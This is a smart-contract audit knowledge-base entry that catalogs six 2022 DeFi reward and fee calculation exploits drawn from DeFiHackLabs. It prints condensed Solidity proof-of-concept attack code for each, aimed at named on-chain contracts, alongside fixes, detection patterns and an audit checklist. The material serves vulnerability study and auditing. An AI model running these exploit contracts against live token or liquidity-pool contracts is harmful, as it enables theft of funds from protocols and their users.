---
protocol: Multi-Protocol
chain: Ethereum, BSC
category: calculation
vulnerability_type: Reward and Fee Calculation Flaws

# Pattern Identity (Required)
root_cause_family: arithmetic_invariant_break
pattern_key: Reward and Fee Calculation Flaws |  |  | Reward inflation, LP pair drain, airdrop multiplication

# Interaction Scope
interaction_scope: single_contract
attack_type:
  - Mass contract deployment reward farming
  - Airdrop recycling via LP transfer
  - Multiple claim without cooldown
  - Zero-value transfer pair burn
  - Reflection token allowance bypass
  - Skim loop fee amplification
source: DeFiHackLabs
total_exploits_analyzed: 6
total_losses: "$1.5M+"
affected_component:
  - Token reward mechanisms
  - Airdrop distribution contracts
  - Staking claim functions
  - Reflection token _transfer logic
  - _spendAllowance calculations
  - Fee-on-transfer skim interactions
primitives:
  - reward_calculation
  - airdrop_recycling
  - claim_replay
  - reflection_desync
  - skim_amplification
  - create2_mass_deployment
severity: HIGH
impact: Reward inflation, LP pair drain, airdrop multiplication
exploitability: Medium to High
financial_impact: "$1.5M+ aggregate"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "skim"
  - "claim"
  - "exploit"
  - "_transfer"
  - "pancakeCall"
  - "testExploit"
  - "claimStakeLp"
  - "transferFrom"
  - "airDropReward"
  - "_spendAllowance"
  - "DPPFlashLoanCall"
  - "distributeAirdrop"
  - "updateUserBalance"
  - "_getStandardAmount"
  - "_getReflectedAmount"
path_keys:
  - "mass_contract_deployment_reward_farming"
  - "airdrop_recycling_via_lp_transfer"
  - "multiple_claim_without_cooldown"
  - "zero_value_transfer_burns_tokens_from_lp_pair"
  - "reflection_token_allowance_bypass"
  - "skim_loop_fee_amplification_across_multiple_pairs"
tags:
  - defihacklabs
  - reward-calculation
  - airdrop
  - multiple-claim
  - reflection-token
  - skim-loop
  - zero-value-transfer
  - mass-contract-deployment
  - fee-amplification
  - VTF
  - RL
  - DPC
  - HEALTH
  - SNOOD
  - YEED
  - Zeed
---

# DeFiHackLabs Reward & Fee Calculation Flaw Patterns (2022)

## References & Source Reports

| Label | Source | Path / URL |
|-------|--------|------------|
| [DPC-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-09/DPC_exp.sol` |
| [HEALTH-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/HEALTH_exp.sol` |
| [RL-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/RL_exp.sol` |
| [SNOOD-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-06/Snood_exp.sol` |
| [VTF-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/VTF_exp.sol` |
| [ZEED-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-04/Zeed_exp.sol` |

---


## Overview

This entry catalogs 6 reward and fee calculation exploits from 2022 sourced from [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs). These represent bugs in token-level reward mechanisms, airdrop distribution, staking claims, and reflection/fee-on-transfer accounting.

**Categories covered:**
1. **Mass Contract Deployment Reward Farming** — CREATE2-deployed contracts each claim rewards (VTF)
2. **Airdrop Recycling via LP Transfer** — Same LP tokens claim airdrop across 100 contracts (RL)
3. **Multiple Claim Without Cooldown** — `claimStakeLp()` callable 9 times consecutively (DPC)
4. **Zero-Value Transfer Pair Burn** — `transfer(self, 0)` burns tokens from LP pair (HEALTH)
5. **Reflection Token Allowance Bypass** — Wrong conversion in `_spendAllowance` (SNOOD)
6. **Skim Loop Fee Amplification** — Fee token excess amplified across 3 pairs (Zeed/YEED)

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `arithmetic_invariant_break` |
| Pattern Key | `Reward and Fee Calculation Flaws |  |  | Reward inflation, LP pair drain, airdrop multiplication` |
| Severity | HIGH |
| Impact | Reward inflation, LP pair drain, airdrop multiplication |
| Interaction Scope | `single_contract` |
| Chain(s) | Ethereum, BSC |


## Vulnerability Description

### Root Cause Analysis

Reward and fee calculation flaws arise from:

1. **No Per-Address Claim Tracking**: Reward/airdrop functions that check balances but don't track whether an address has already claimed, enabling recycling through multiple contracts (VTF, RL)
2. **Missing Claim Cooldowns**: Staking claim functions with no per-user cooldown or single-use flag, allowing repeated claims in one transaction (DPC)
3. **Transfer Side Effects on LP Pairs**: Custom `_transfer()` logic that burns tokens from specified addresses (like LP pairs) regardless of transfer amount, including zero-value transfers (HEALTH)
4. **Reflection Accounting Errors**: Functions using the wrong conversion between reflected and standard amounts, breaking allowance checks or balance representations (SNOOD)
5. **Cross-Pair Fee Accumulation**: Fee-on-transfer tokens that create excess balances in LP pairs, amplifiable via `skim()` loops across multiple pairs (Zeed)

---

## Vulnerable Pattern Examples

### Pattern 1: Mass Contract Deployment Reward Farming

> **pathShape**: `callback-reentrant`

**Severity**: 🟠 HIGH | **Loss**: ~$50K | **Protocol**: VTF Token | **Chain**: BSC

The VTF token has a public `updateUserBalance()` that distributes rewards to any caller. By deploying 400 contracts via CREATE2 (each calling `updateUserBalance` in its constructor), the attacker registers 400 reward recipients. After a waiting period, each contract claims rewards and passes tokens along.

```solidity
// @audit-issue Public updateUserBalance registers any address for rewards
contract claimReward {
    IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
    
    // @audit Constructor self-registers for rewards
    constructor() {
        VTF.updateUserBalance(address(this));
    }
    
    function claim(address receiver) external {
        // @audit Claim accumulated rewards
        VTF.updateUserBalance(address(this));
        VTF.transfer(receiver, VTF.balanceOf(address(this)));
    }
}

// Attack orchestrator
function testExploit() public {
    // Step 1: Deploy 400 contracts via CREATE2
    contractFactory();  // Each constructor calls updateUserBalance
    
    // Step 2: Wait 2 days for rewards to accrue
    cheat.warp(block.timestamp + 2 * 24 * 60 * 60);
    
    // Step 3: Flash loan 100K USDT → buy VTF
    DVM(dodo).flashLoan(0, 100_000 * 1e18, address(this), new bytes(1));
    
    // Inside flash loan callback:
    // Pass VTF through all 400 contracts, each claims rewards
    for (uint256 i = 0; i < 400; i++) {
        VTF.transfer(contractAddress[i], VTF.balanceOf(address(this)));
        // @audit Each contract claims its accrued share
        contractAddress[i].call(abi.encodeWithSignature("claim(address)", address(this)));
    }
    
    // Step 4: Sell accumulated VTF → repay flash loan → profit ~$50K
}
```

**Reference**: [DeFiHackLabs/src/test/2022-10/VTF_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/VTF_exp.sol) | Block: 22,535,101

---

### Pattern 2: Airdrop Recycling via LP Transfer

> **pathShape**: `atomic`

**Severity**: 🟠 HIGH | **Loss**: RL tokens | **Protocol**: RL Token | **Chain**: BSC

The `distributeAirdrop()` function distributes rewards based on LP token balance without tracking prior claims. By transferring LP to 100 pre-deployed contracts and calling `distributeAirdrop` from each, the same LP tokens claim rewards 100 times.

```solidity
// @audit-issue distributeAirdrop checks balanceOf but not prior claims
contract AirDropRewardContract {
    RLLpIncentive RLL = RLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);
    IERC20 Pair = IERC20(0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e);
    
    function airDropReward(address receiver) external {
        // @audit No claim tracking — same LP can claim from different addresses
        RLL.distributeAirdrop(address(this));
        RL.transfer(receiver, RL.balanceOf(address(this)));
        Pair.transfer(receiver, Pair.balanceOf(address(this)));
    }
}

// Attack: transfer LP to each of 100 contracts, each claims airdrop
function exploit() internal {
    for (uint256 i = 0; i < contractAddress.length; i++) {
        // @audit Same LP tokens → different address → claim again
        Pair.transfer(contractAddress[i], Pair.balanceOf(address(this)));
        contractAddress[i].call(
            abi.encodeWithSignature("airDropReward(address)", address(this))
        );
    }
    // Result: 100x airdrop rewards from same LP tokens
}
```

**Reference**: [DeFiHackLabs/src/test/2022-10/RL_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/RL_exp.sol) | Block: 21,794,289

---

### Pattern 3: Multiple Claim Without Cooldown

> **pathShape**: `atomic`

**Severity**: 🟠 HIGH | **Loss**: $103,755 | **Protocol**: DPC Token | **Chain**: BSC

The `claimStakeLp()` function has no per-user cooldown or single-claim flag. After staking LP and waiting 24 hours, the attacker calls `claimStakeLp` 9 times consecutively in the same transaction, draining the staking rewards pool.

```solidity
// @audit-issue claimStakeLp has no per-claim tracking or cooldown
function testExploit() public {
    // Step 1: Stake LP tokens
    DPC.tokenAirdrop(address(this), address(DPC), 100);
    addDPCLiquidity();
    DPC.stakeLp(address(this), address(DPC), Pair.balanceOf(address(this)));
    
    // Step 2: Wait 24 hours
    cheats.warp(block.timestamp + 24 * 60 * 60);
    
    // Step 3: Claim 9 times — no cooldown enforcement!
    // @audit Each call returns the same reward amount — no deduction between calls
    for (uint256 i = 0; i < 9; i++) {
        DPC.claimStakeLp(address(this), 1);
    }
    
    // Step 4: Also claim airdrop for bonus
    DPC.claimDpcAirdrop(address(this));
    
    // Result: 9x staking rewards + airdrop = $103K profit
}
```

**Reference**: [DeFiHackLabs/src/test/2022-09/DPC_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/DPC_exp.sol) | Block: 21,179,209

---

### Pattern 4: Zero-Value Transfer Burns Tokens From LP Pair

> **pathShape**: `atomic`

**Severity**: 🟠 HIGH | **Loss**: ~16.64 BNB | **Protocol**: HEALTH Token | **Chain**: BSC

The HEALTH token's `_transfer()` function contains logic that burns tokens from the LP pair on every transfer, even zero-value self-transfers. By calling `transfer(self, 0)` 1000 times, the attacker burns most of the pair's HEALTH tokens, artificially inflating the price.

```solidity
// @audit-issue _transfer burns pair tokens even on zero-value self-transfers
function testExploit() public {
    // Step 1: Flash loan 40 WBNB → swap to HEALTH
    DVM(dodo).flashLoan(0, 40 * 1e18, address(this), new bytes(1));
}

function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
    _WBNBToHEALTH();  // Buy HEALTH with flash-loaned WBNB
    
    // Step 2: 1000 zero-value self-transfers
    // @audit Each transfer(self, 0) triggers _transfer which burns pair tokens
    for (uint256 i = 0; i < 1000; i++) {
        HEALTH_TOKEN.transfer(address(this), 0);
        // @audit Pair HEALTH balance decreases by burn amount each iteration
    }
    
    // Step 3: HEALTH price is now massively inflated
    // Pair has minimal HEALTH vs lots of WBNB
    _HEALTHToWBNB();  // Sell at inflated price
    
    // Step 4: Repay flash loan → profit ~16.64 BNB
    WBNB_TOKEN.transfer(DODO_DVM, 40 * 1e18);
}
```

**Reference**: [DeFiHackLabs/src/test/2022-10/HEALTH_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/HEALTH_exp.sol) | Block: 22,337,425

---

### Pattern 5: Reflection Token Allowance Bypass

> **pathShape**: `atomic`

**Severity**: 🔴 CRITICAL | **Loss**: 104 ETH | **Protocol**: SNOOD Token | **Chain**: Ethereum

SNOOD uses a reflection mechanism but its `_spendAllowance` function incorrectly uses `_getStandardAmount` instead of `_getReflectedAmount`. This allows calling `transferFrom` on the Uniswap pair without proper allowance verification, draining the pair's SNOOD tokens.

```solidity
// @audit-issue _spendAllowance uses wrong conversion → allowance check bypassed
function testExploit() public {
    uint256 balance = SNOOD.balanceOf(address(uniLP));
    
    // Step 1: Drain pair's SNOOD via broken allowance check
    // @audit transferFrom succeeds despite attacker having 0 allowance from pair
    // _spendAllowance converts amounts incorrectly due to _getStandardAmount bug
    require(SNOOD.transferFrom(address(uniLP), address(this), balance - 1));
    
    // Step 2: Sync pair reserves to reflect drained balance
    uniLP.sync();  // SNOOD reserve ≈ 0
    
    // Step 3: Return SNOOD tokens to pair
    require(SNOOD.transfer(address(uniLP), balance - 1));
    
    // Step 4: Swap at manipulated k-constant
    // @audit Pair sees large SNOOD deposit vs near-zero prior reserve → outputs excess WETH
    (uint112 a, uint112 b,) = uniLP.getReserves();
    uint256 amount0Out = ((balance - 1) * 9970 * a) / (b * 10_000 + (balance - 1) * 9970);
    uniLP.swap(amount0Out, 0, attacker, "");
    // Profit: 104 ETH
}
```

**Reference**: [DeFiHackLabs/src/test/2022-06/Snood_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/Snood_exp.sol) | Block: 14,983,660

---

### Pattern 6: Skim Loop Fee Amplification Across Multiple Pairs

> **pathShape**: `iterative-loop`

**Severity**: 🔴 CRITICAL | **Loss**: ~$1M | **Protocol**: Zeed Finance (YEED) | **Chain**: BSC

The YEED token's fee mechanism creates excess token balances in LP pairs (actual balance > tracked reserves). By `skim()`-ing the excess from one pair to another in a loop across 3 pairs, the excess is amplified 10x per cycle. After 10 cycles, the attacker claims accumulated surplus from all pairs.

```solidity
// @audit-issue Fee-on-transfer creates skimmable excess — amplified via cross-pair loop
function pancakeCall(address, uint256, uint256 amount1, bytes calldata) public {
    // Flash loan YEED from HoSwap pair
    yeed.transfer(address(usdtYeedPair), amount1);
    
    // @audit 10 skim cycles across 3 pairs — amplifies excess balance each time
    for (uint256 i = 0; i < 10; i++) {
        // skim() sends tokens in excess of tracked reserves to target
        usdtYeedPair.skim(address(hoYeedPair));     // excess → hoYeedPair
        hoYeedPair.skim(address(zeedYeedPair));      // excess → zeedYeedPair
        zeedYeedPair.skim(address(usdtYeedPair));    // excess → usdtYeedPair
        // @audit Each fee deduction creates new excess at the destination
    }
    
    // @audit Collect all accumulated excess from all 3 pairs
    usdtYeedPair.skim(address(this));
    hoYeedPair.skim(address(this));
    zeedYeedPair.skim(address(this));
    
    // Repay flash loan
    yeed.transfer(msg.sender, (amount1 * 1000) / 997);
    // Profit: ~$1M in YEED tokens
}
```

**Reference**: [DeFiHackLabs/src/test/2022-04/Zeed_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/Zeed_exp.sol) | Block: 17,132,514

---

## Impact Analysis

| Protocol | Date | Loss | Root Cause | Chain |
|----------|------|------|-----------|-------|
| Zeed/YEED | Apr 2022 | ~$1M | Skim loop fee amplification | BSC |
| DPC | Sep 2022 | $103K | Multiple claim without cooldown | BSC |
| SNOOD | Jun 2022 | 104 ETH | Reflection allowance bypass | Ethereum |
| VTF | Oct 2022 | ~$50K | Mass contract reward farming | BSC |
| HEALTH | Oct 2022 | ~16.64 BNB | Zero-value transfer pair burn | BSC |
| RL | Oct 2022 | RL tokens | Airdrop recycling via LP transfer | BSC |

**Aggregate**: Over $1.5M in losses from reward/calculation flaws.

---

## Secure Implementation

### Fix 1: Per-Address Claim Tracking

```solidity
// SECURE: Track claims per address to prevent recycling
contract SecureAirdrop {
    mapping(address => bool) public hasClaimed;
    mapping(address => uint256) public lastClaimTimestamp;
    uint256 public constant CLAIM_COOLDOWN = 7 days;
    
    function distributeAirdrop(address recipient) external {
        // @audit-fix Check if already claimed
        require(!hasClaimed[recipient], "Already claimed");
        // @audit-fix Enforce cooldown
        require(
            block.timestamp >= lastClaimTimestamp[recipient] + CLAIM_COOLDOWN,
            "Cooldown active"
        );
        
        uint256 reward = calculateReward(recipient);
        hasClaimed[recipient] = true;
        lastClaimTimestamp[recipient] = block.timestamp;
        
        token.transfer(recipient, reward);
    }
}
```

### Fix 2: Staking Claim with Deduction

```solidity
// SECURE: Deduct claimed rewards and enforce claim-once-per-period
contract SecureStaking {
    mapping(address => uint256) public accumulatedRewards;
    mapping(address => uint256) public claimedRewards;
    
    function claimStakeLp(address user) external {
        uint256 pending = accumulatedRewards[user] - claimedRewards[user];
        require(pending > 0, "Nothing to claim");
        
        // @audit-fix Deduct claimed amount — prevents multiple claims
        claimedRewards[user] = accumulatedRewards[user];
        
        token.transfer(user, pending);
    }
}
```

### Fix 3: Safe Transfer Logic (No Pair Side Effects)

```solidity
// SECURE: _transfer should not burn from pair on zero-value transfers
function _transfer(address from, address to, uint256 amount) internal {
    require(from != address(0), "Zero from");
    require(to != address(0), "Zero to");
    
    // @audit-fix Skip all side effects for zero-value transfers
    if (amount == 0) {
        emit Transfer(from, to, 0);
        return;
    }
    
    // @audit-fix Only apply fees on non-excluded addresses
    uint256 fee = isExcluded[from] || isExcluded[to] ? 0 : amount * feeRate / 10000;
    _balances[from] -= amount;
    _balances[to] += amount - fee;
    
    if (fee > 0) {
        _balances[feeRecipient] += fee;
    }
}
```

### Fix 4: Correct Reflection Amount Conversion

```solidity
// SECURE: Use consistent amount conversion in allowance checks
function _spendAllowance(address owner, address spender, uint256 amount) internal {
    uint256 currentAllowance = allowance[owner][spender];
    if (currentAllowance != type(uint256).max) {
        // @audit-fix Use the SAME amount type (reflected or standard) consistently
        // Do NOT mix _getStandardAmount and _getReflectedAmount
        require(currentAllowance >= amount, "Insufficient allowance");
        allowance[owner][spender] = currentAllowance - amount;
    }
}
```

---

## Detection Patterns

### Static Analysis

```yaml
- pattern: "updateUserBalance|distributeAirdrop|claimReward"
  check: "Verify per-address claim tracking (hasClaimed mapping) exists"
  
- pattern: "claimStakeLp|claimReward|harvest"
  check: "Verify claimed amount is deducted from pending — prevent repeat claims"
  
- pattern: "_transfer.*burn|_transfer.*pair|_transfer.*fee"
  check: "Verify zero-value transfers are handled separately — no side effects"
  
- pattern: "_spendAllowance.*getStandard|_spendAllowance.*getReflect"
  check: "Verify amount conversion is consistent — same type throughout"
  
- pattern: "skim\\(.*pair|skim.*loop"
  check: "Verify fee-on-transfer tokens don't create amplifiable excess via skim"
  
- pattern: "CREATE2.*constructor.*claim|new.*constructor.*update"
  check: "Verify reward functions can't be gamed via mass contract deployment"
```

### Invariant Checks

```
INV-CALC-001: Each address can only claim airdrop rewards once per eligibility period
INV-CALC-002: Accumulated claimed rewards must equal total distributed — no double-claims
INV-CALC-003: Zero-value transfers must not trigger burns, fees, or state changes on LP pairs
INV-CALC-004: _spendAllowance must use consistent amount conversions (reflected vs standard)
INV-CALC-005: skim() across multiple pairs must not amplify extractable surplus
INV-CALC-006: balanceOf-based reward must require locked deposits, not transferable balances
```

---

## Audit Checklist

- [ ] **Claim Tracking**: Does the reward/airdrop function track which addresses have already claimed?
- [ ] **Claim Cooldown**: Is there a per-user cooldown or single-use flag on staking claim functions?
- [ ] **Zero-Value Transfers**: Does the token's `_transfer` handle `amount == 0` correctly? No pair burns?
- [ ] **Reflection Consistency**: In reflection tokens, are allowance checks using the correct amount conversion?
- [ ] **Skim Safety**: With fee-on-transfer tokens, can `skim()` loops across multiple pairs amplify excess?
- [ ] **Mass Deployment**: Can attackers register for rewards via CREATE2-deployed contracts?
- [ ] **LP Transfer Recycling**: Can the same LP tokens claim rewards from multiple addresses by transferring between them?

---

## Real-World Examples

| Protocol | Date | Loss | TX/Reference |
|----------|------|------|-------------|
| Zeed Finance | Apr 2022 | ~$1M | [BSCScan](https://bscscan.com/tx/0x0507476234193a9a5c7ae2c47e4c4b833a7c3923cefc6fd7667b72f3ca3fa83a) |
| DPC | Sep 2022 | $103K | Block 21,179,209 (BSC) |
| SNOOD | Jun 2022 | 104 ETH | [Etherscan](https://etherscan.io/tx/0x9a6227ef97d7ce75732645bd604ef128bb5dfbc1bfbe0966ad1cd2870d45a20e) |
| VTF | Oct 2022 | ~$50K | [BSCScan](https://bscscan.com/tx/0xeeaf7e9662a7488ea724223c5156e209b630cdc21c961b85868fe45b64d9b086) |
| HEALTH | Oct 2022 | ~16.64 BNB | Block 22,337,425 (BSC) |
| RL | Oct 2022 | RL tokens | Block 21,794,289 (BSC) |

---

## Keywords

reward_calculation, fee_calculation, airdrop_recycling, multiple_claim, claim_cooldown, zero_value_transfer, pair_burn, reflection_token, _spendAllowance, skim_loop, skim_amplification, fee_on_transfer, create2_deployment, mass_contract, updateUserBalance, distributeAirdrop, claimStakeLp, defihacklabs, VTF, RL, DPC, HEALTH, SNOOD, YEED, Zeed
